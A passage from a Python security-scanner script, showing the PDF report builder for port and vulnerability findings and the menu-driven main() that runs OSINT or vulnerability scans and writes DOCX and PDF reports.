                        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                        ('FONTSIZE', (0, 0), (-1, 0), 12),
                        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                        ('GRID', (0, 0), (-1, -1), 1, colors.black)
                    ]))
                    story.append(ports_table)
                    story.append(Spacer(1, 12))
                
                # OS Fingerprint
                if 'os_fingerprint' in self.scan_results['osint_results']:
                    story.append(Paragraph("OS Fingerprinting", styles['Heading3']))
                    story.append(Paragraph(self.scan_results['osint_results']['os_fingerprint'], styles['Normal']))
                    story.append(Spacer(1, 12))
            
            # Vulnerability Results
            if self.scan_results['vulnerability_results']:
                story.append(Paragraph("Vulnerability Assessment", styles['Heading2']))
                
                vulns = self.scan_results['vulnerability_results']
                critical = len([v for v in vulns if v['severity'] == 'Critical'])
                high = len([v for v in vulns if v['severity'] == 'High'])
                medium = len([v for v in vulns if v['severity'] == 'Medium'])
                low = len([v for v in vulns if v['severity'] == 'Low'])
                
                # Summary
                story.append(Paragraph("Vulnerability Summary", styles['Heading3']))
                summary_data = [
                    ['Severity', 'Count'],
                    ['Total', str(len(vulns))],
                    ['Critical', str(critical)],
                    ['High', str(high)],
                    ['Medium', str(medium)],
                    ['Low', str(low)]
                ]
                
                summary_table = Table(summary_data)
                summary_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 12),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
                ]))
                story.append(summary_table)
                story.append(Spacer(1, 20))
                
                # Detailed Vulnerabilities
                story.append(Paragraph("Detailed Findings", styles['Heading3']))
                vuln_data = [['Vulnerability', 'Severity', 'Description']]
                for vuln in vulns:
                    desc = vuln['description'][:80] + '...' if len(vuln['description']) > 80 else vuln['description']
                    vuln_data.append([vuln['type'], vuln['severity'], desc])
                
                vuln_table = Table(vuln_data, colWidths=[2*72, 1*72, 3*72])
                vuln_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 10),
                    ('FONTSIZE', (0, 1), (-1, -1), 8),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black),
                    ('VALIGN', (0, 0), (-1, -1), 'TOP')
                ]))
                story.append(vuln_table)
            
            # Build PDF
            doc.build(story)
            print(f"[✓] PDF report saved as: {filename}")
            return filename
            
        except Exception as e:
            print(f"[✗] Error generating PDF report: {e}")
            return None

def main():
    """Main program entry point"""
    print("="*60)
    print("     Welcome to Enhanced Security Scanner v2.0")
    print("="*60)
    print("Features:")
    print("• OSINT Module (Port scanning, OS fingerprinting, Subdomain enumeration)")
    print("• Vulnerability Scanner (XSS, SQLi, Directory traversal, etc.)")
    print("• Professional report generation (DOCX & PDF)")
    print("="*60)
    
    scanner = SecurityScanner()
    
    print("\nSelect scanning module:")
    print("1. OSINT Module")
    print("2. Vulnerability Scanner Module")
    print("3. Both (Comprehensive Scan)")
    
    choice = input("Enter your choice (1, 2, or 3): ").strip()
    
    try:
        if choice == "1":
            asyncio.run(scanner.osint_module())
        elif choice == "2":
            vuln_scanner = VulnerabilityScanner(scanner)
            vuln_scanner.scan()
            vuln_scanner.report_vulnerabilities()
        elif choice == "3":
            print("\n[✓] Starting comprehensive security scan...")
            asyncio.run(scanner.osint_module())
            print("\n" + "="*50)
            print("Starting vulnerability assessment...")
            vuln_scanner = VulnerabilityScanner(scanner)
            vuln_scanner.scan()
            vuln_scanner.report_vulnerabilities()
        else:
            print("Invalid choice. Exiting the program.")
            return
        
        # Generate reports
        if scanner.scan_results['osint_results'] or scanner.scan_results['vulnerability_results']:
            print("\n" + "="*50)
            print("Generating professional reports...")
            
            report_gen = ReportGenerator(scanner.scan_results)
            
            # Generate both DOCX and PDF reports
            docx_file = report_gen.generate_docx_report()
            pdf_file = report_gen.generate_pdf_report()
            
            print("\n[✓] Scan completed successfully!")
            print(f"[✓] Reports generated:")
            if docx_file:
                print(f"    • DOCX: {docx_file}")
            if pdf_file:
                print(f"    • PDF: {pdf_file}")
        else:
            print("\n[!] No scan results to generate reports.")
            
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user.")
    except Exception as e:
        print(f"\n[✗] An error occurred: {e}")
        logger.exception("Unexpected error in main()")

if __name__ == "__main__":
    # Check for required dependencies
    try:
        import docx
        from reportlab.lib.pagesizes import letter
    except ImportError as e:
        print(f"[✗] Missing required dependency: {e}")
        print("\nInstall required packages with:")
        print("pip install python-docx reportlab requests dnspython")
        sys.exit(1)
    
    main()